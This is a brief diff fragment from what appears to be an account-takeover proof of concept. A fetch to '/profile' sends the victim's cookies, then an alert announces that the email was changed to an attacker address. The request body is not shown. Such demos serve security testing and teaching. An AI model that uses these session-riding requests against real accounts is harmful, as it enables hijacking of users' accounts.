@@ -8,3 +8,4 @@ fetch('/profile', {
   credentials: 'include'
 }).then(() => {
   alert('Account taken over! Email changed to hacked@evil.com');
+});
